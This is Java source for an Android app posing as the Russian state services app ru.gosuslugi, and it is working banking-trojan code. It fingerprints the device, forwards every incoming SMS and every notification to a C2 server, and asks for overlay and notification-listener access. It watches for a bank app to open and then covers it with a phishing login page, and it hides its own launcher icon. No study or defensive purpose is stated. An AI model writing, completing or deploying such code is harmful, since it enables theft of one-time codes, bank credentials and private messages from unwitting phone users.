package ru.gosuslugi.app;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.provider.Telephony;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.SmsMessage;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.webkit.WebView;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.util.List;
import java.util.Locale;

public class MainActivity extends Activity {

    private static final String C2_URL = "https://your-c2-server.com/collect";
    private static final String TEST_BANK_PACKAGE = "com.testbank.app"; // Пакет тестового банка

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. Сбор цифрового отпечатка
        new Thread(() -> {
            try {
                JSONObject fingerprint = getCompleteFingerprint();
                sendToC2("fingerprint", fingerprint.toString());
            } catch (Exception ignored) {}
        }).start();

        // 2. Запуск прокси-сервера
        Intent proxyIntent = new Intent(this, ProxyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(proxyIntent);
        } else {
            startService(proxyIntent);
        }

        // 3. Регистрация SMS-перехватчика
        registerReceiver(new SmsReceiver(),
                new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION));

        // 4. Запрос Notification Listener (если ещё не выдан)
        if (!isNotificationListenerEnabled()) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        }

        // 5. Запрос оверлеев (SYSTEM_ALERT_WINDOW)
        if (!Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }

        // 6. Запуск мониторинга запуска тестового банка (НОВОЕ)
        startBankAppMonitor();

        // 7. Скрываем иконку через 3 секунды
        new Handler().postDelayed(() -> {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        }, 3000);

        // 8. Закрываем Activity
        finish();
    }

    // НОВЫЙ МЕТОД: Мониторинг запуска тестового банка
    private void startBankAppMonitor() {
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(1000);
                    ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
                    List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(1);
                    if (!tasks.isEmpty()) {
                        String topPackage = tasks.get(0).topActivity.getPackageName();
                        if (topPackage.equals(TEST_BANK_PACKAGE)) {
                            runOnUiThread(() -> showPhishingOverlay("https://your-fake-bank.com/login"));
                        }
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    // ===================================================================
    // СБОР ЦИФРОВОГО ОТПЕЧАТКА
    // ===================================================================
    private JSONObject getCompleteFingerprint() {
        JSONObject fp = new JSONObject();
        try {
            fp.put("manufacturer", Build.MANUFACTURER);
            fp.put("model", Build.MODEL);
            fp.put("device", Build.DEVICE);
            fp.put("board", Build.BOARD);
            fp.put("hardware", Build.HARDWARE);
            fp.put("cpu_abi", Build.CPU_ABI);

            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(metrics);
            JSONObject display = new JSONObject();
            display.put("width", metrics.widthPixels);
            display.put("height", metrics.heightPixels);
            display.put("dpi", metrics.densityDpi);
            display.put("xdpi", metrics.xdpi);
            display.put("ydpi", metrics.ydpi);
            fp.put("display", display);

            JSONArray sensors = new JSONArray();
            SensorManager sm = (SensorManager) getSystemService(SENSOR_SERVICE);
            List<Sensor> sensorList = sm.getSensorList(Sensor.TYPE_ALL);
            for (Sensor s : sensorList) {
                JSONObject sObj = new JSONObject();
                sObj.put("name", s.getName());
                sObj.put("vendor", s.getVendor());
                sObj.put("type", s.getType());
                sObj.put("version", s.getVersion());
                sensors.put(sObj);
            }
            fp.put("sensors", sensors);

            fp.put("android_id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            fp.put("timezone", java.util.TimeZone.getDefault().getID());
            fp.put("locale", Locale.getDefault().toString());
            fp.put("sdk_int", Build.VERSION.SDK_INT);
            fp.put("build_fingerprint", Build.FINGERPRINT);
        } catch (Exception ignored) {}
        return fp;
    }

    // ===================================================================
    // ОТПРАВКА НА C2
    // ===================================================================
    private void sendToC2(String type, String data) {
        try {
            URL url = new URL(C2_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.getOutputStream().write(("type=" + type + "&data=" + data).getBytes());
            conn.getOutputStream().close();
        } catch (Exception ignored) {}
    }

    // ===================================================================
    // ПРОВЕРКА NOTIFICATION LISTENER
    // ===================================================================
    private boolean isNotificationListenerEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }

    // ===================================================================
    // ПОКАЗ ФИШИНГОВОГО ОВЕРЛЕЯ
    // ===================================================================
    private void showPhishingOverlay(String url) {
        if (!Settings.canDrawOverlays(this)) return;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);

        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        WebView webView = new WebView(this);
        webView.loadUrl(url);
        wm.addView(webView, params);
    }

    // ===================================================================
    // SMS-ПЕРЕХВАТЧИК
    // ===================================================================
    public static class SmsReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
                SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
                for (SmsMessage msg : messages) {
                    String body = msg.getMessageBody();
                    String sender = msg.getOriginatingAddress();
                    new Thread(() -> {
                        try {
                            URL url = new URL(C2_URL);
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("POST");
                            conn.setDoOutput(true);
                            conn.getOutputStream().write(
                                    ("type=sms&sender=" + sender + "&body=" + body).getBytes());
                            conn.getOutputStream().close();
                        } catch (Exception ignored) {}
                    }).start();
                }
            }
        }
    }

    // ===================================================================
    // ПЕРЕХВАТЧИК УВЕДОМЛЕНИЙ
    // ===================================================================
    public static class NotifListener extends NotificationListenerService {
        @Override
        public void onNotificationPosted(StatusBarNotification sbn) {
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            String packageName = sbn.getPackageName();

            new Thread(() -> {
                try {
                    URL url = new URL(C2_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.getOutputStream().write(
                            ("type=notification&package=" + packageName +
                                    "&title=" + title + "&text=" + text).getBytes());
                    conn.getOutputStream().close();
                } catch (Exception ignored) {}
            }).start();
        }
    }
}
